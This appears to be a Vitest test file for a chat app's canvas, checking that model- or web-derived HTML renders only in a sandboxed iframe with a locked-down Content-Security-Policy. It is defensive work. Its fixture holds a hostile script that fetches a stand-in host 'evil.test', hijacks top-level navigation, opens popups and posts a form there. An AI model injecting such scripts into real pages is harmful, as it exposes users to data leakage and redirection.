// @vitest-environment happy-dom

import type { Artifact } from "@psyche/protocol";
import type { ArtifactRenderProps } from "@psyche/ui";
import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { renderArtifact } from "../../src/compose/canvas.tsx";

afterEach(cleanup);

const html = (body: string, over: Partial<Artifact> = {}): ArtifactRenderProps => ({
  artifact: {
    id: "art_h",
    libraryItemId: "lib",
    type: "html",
    title: "Page",
    version: 1,
    nameSlug: "page",
    sourceRef: null,
    updatedAt: "2026-10-26T10:00:00Z",
    ...over,
  },
  content: { artifactId: "art_h", version: 1, type: "html", content: body, totalLines: 1 },
  editing: false,
  onChange: () => {},
});

/** The canvas puts model- and web-derived HTML in exactly one place: this frame. */
describe("canvas html sandbox (chat-experience-2026 §4.6)", () => {
  const hostile =
    '<script>fetch("https://evil.test/x");top.location="https://evil.test";window.open("https://evil.test")</script><form action="https://evil.test"></form>';

  function frame(): HTMLIFrameElement {
    const { container } = render(<div>{renderArtifact(html(hostile))}</div>);
    const el = container.querySelector("iframe");
    if (el === null) throw new Error("no frame");
    return el;
  }

  it("is an opaque-origin frame: allow-scripts only, nothing else", () => {
    const sandbox = frame().getAttribute("sandbox");
    expect(sandbox).toBe("allow-scripts");
    for (const token of [
      "allow-same-origin",
      "allow-top-navigation",
      "allow-top-navigation-by-user-activation",
      "allow-popups",
      "allow-popups-to-escape-sandbox",
      "allow-forms",
      "allow-modals",
      "allow-downloads",
      "allow-storage-access-by-user-activation",
    ])
      expect(sandbox ?? "").not.toContain(token);
  });

  it("carries a CSP that closes the network, frames, workers, forms and base", () => {
    const doc = frame().getAttribute("srcdoc") ?? "";
    const csp = /Content-Security-Policy" content="([^"]+)"/.exec(doc)?.[1] ?? "";
    for (const directive of [
      "default-src 'none'",
      "connect-src 'none'",
      "frame-src 'none'",
      "worker-src 'none'",
      "object-src 'none'",
      "form-action 'none'",
      "base-uri 'none'",
    ])
      expect(csp, directive).toContain(directive);
    // No remote images or scripts by origin, no eval.
    expect(csp).not.toContain("https:");
    expect(csp).not.toContain("unsafe-eval");
    // The CSP comes first: before the bridge and before any artifact markup.
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<script"));
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("evil.test"));
    expect(frame().getAttribute("referrerpolicy")).toBe("no-referrer");
  });

  it("is never the hosted placement with same-origin", () => {
    // No host URL is configured for the canvas: the frame is the inline, opaque-origin one.
    expect(frame().getAttribute("src")).toBeNull();
  });

  it("does not draw html while it is being edited, and other types are left to the kit", () => {
    const { container } = render(
      <div>{renderArtifact({ ...html("<b>x</b>"), editing: true })}</div>,
    );
    expect(container.querySelector("iframe")).toBeNull();
    const doc = renderArtifact(html("# hi", { type: "doc" }));
    expect(doc).toBeUndefined();
  });
});
